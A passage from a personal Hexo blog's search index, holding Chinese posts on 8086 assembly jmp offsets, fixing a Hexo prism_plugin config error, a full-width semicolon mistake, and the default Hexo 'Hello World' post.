src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/2.png" alt="2"><br><img src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/3.png" alt="3"><br> 这里jump  0008就是到s的地址，在之前s的内存已经被s2覆盖于是cs ip指向s2代表的代码，于是执行后cs ip指向下一指令也就是0010到0011的数<br>据储存，将其作为代码执行。<br>那么问题来了，为什么变成了jmp 0000了？<br><img src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/4.png" alt="4"><br>如图：<br>因为jmp指令是根据s2到s1的标号偏移量决定的，在还没执行前就已经定好了即决定了偏移量为F6，而F6作为补码<br>储存，作用为-10，也就是减10个字节。也就从0010减到了0000 也就是开始的代码<br>mov ax,4c00h<br>int 21h<br>最终结束。<br>总结：jmp并不是随意跳跃的，是在开始就决定好的偏移量，如果如上题转换位置也只会按原来规定的偏移量进行，并不能换到我们目标位置。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百度是个好东西</title>
      <link href="/2022/09/25/%E7%99%BE%E5%BA%A6%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B8%9C%E8%A5%BF/"/>
      <url>/2022/09/25/%E7%99%BE%E5%BA%A6%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B8%9C%E8%A5%BF/</url>
      
        <content type="html"><![CDATA[<p>今儿修改博客主题时又碰到了该死的hexo d出错，我貌似跟这玩意特别有缘，（可能是我删了什么东西……）委实不好评价我这个冤大头，一个字作！<br>于是我又去麻烦了学长，最终在学长的英明指导下在百度解决了问题。<br>问题如下：<br>Error: <code>prism_plugin</code> options should be added to _config.yml file<br>解决方法：<br>在blog目录下的conj.yml中打开，将以下代码放在最后即可，重新启动生成部署</p><pre class="line-numbers language-none"><code class="language-none">prism_plugin:  mode: &#39;preprocess&#39; # realtime&#x2F;preprocess  theme: &#39;default&#39;  line_number: false # default false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以百度是个好东西！！！<br>（希望学长大大别对我感到厌烦）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 报错解决 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>千万要注意中英文！啊！啊！</title>
      <link href="/2022/09/20/%E5%8D%83%E4%B8%87%E8%A6%81%E6%B3%A8%E6%84%8F%E4%B8%AD%E8%8B%B1%E6%96%87%EF%BC%81%E5%95%8A%EF%BC%81%E5%95%8A%EF%BC%81/"/>
      <url>/2022/09/20/%E5%8D%83%E4%B8%87%E8%A6%81%E6%B3%A8%E6%84%8F%E4%B8%AD%E8%8B%B1%E6%96%87%EF%BC%81%E5%95%8A%EF%BC%81%E5%95%8A%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>  由于是第一次搭博客，遇到了很多问题。特别是在hexo g出错时，作为小白本白的我不出意外的被卡住了，看着天书一般的代码，我头皮发麻<br>……被将近卡住了半小时，哈哈，希望别笑我最终发现在最后的一个分号“;”我用成了中文字符导致出错，我给大家看看区别   英文“;”，中文“；”<br>中文字符更宽，呜呜呜！希望以后别碰到这种事……</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/09/20/hello-world/"/>
      <url>/2022/09/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
